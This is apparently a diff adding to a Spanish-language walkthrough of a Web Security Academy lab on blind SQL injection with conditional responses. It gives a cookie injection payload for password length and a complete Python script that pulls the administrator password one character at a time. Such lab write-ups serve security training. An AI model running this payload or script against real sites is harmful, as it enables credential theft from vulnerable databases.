@@ -127,3 +127,52 @@ Sec-Fetch-User: ?1
 Te: trailers
 ```
 Por lo que podemos inferir que si una consulta es verdadera recibimos el mensaje "Welcome back" y si es falsa no lo recibimos, aunque podemos observar un patron de comportamiento por parte del servidor, aun asi no podemos ver ningun tipo de informacion en nuestras consultas por lo que temos que extraer la informacion letra por letra utilizando la funcion SUBSTRING().
+
+Primero obtenemos la longitud de la ```password```
+```sql
+TrackingId=iYMM1GrXuxAnojK7' AND (SELECT 1 FROM users WHERE username='administrator' AND LENGTH(password)=20)=1-- -
+```
+Luego se creo el siguiente script en python y se pudo obtener el valor de esta password
+```python
+import sys
+import requests
+from urllib.parse import urlparse
+
+if len(sys.argv) <  4:
+    print ('Usage: python3 BlindConditional.py https://aaaaa.web-security-academy.net/ TrackingId=aaaa session=aaaa')
+    sys.exit(1)
+url = sys.argv[1]
+parsed_url = urlparse(url)
+host= parsed_url.netloc
+dictionary = 'abcdefghijklmnopqrstuvwxyz1234567890'
+password = ''
+payload_prefix = sys.argv[2] + "' "
+
+for i in range(0, 20):
+    for j in dictionary:
+        tmp = "AND (SELECT SUBSTRING(password,%d,1) from users where username='administrator')='%s" % (i+1, j)
+        payload = payload_prefix + tmp
+        headers = {
+            'Host': host,
+            'Cookie': payload + '; ' + sys.argv[3],
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Referer': sys.argv[1],
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Te': 'trailers'
+        }
+        response = requests.get(url, headers=headers)
+        print(f'Trying with {headers}')
+        if "Welcome back" in response.text:
+            password += j
+            print(f"Found character at position {i+1}: {password}")
+            break  # Salir del bucle interno una vez encontrado el carácter
+
+print(f"Password found: {password}")
+```
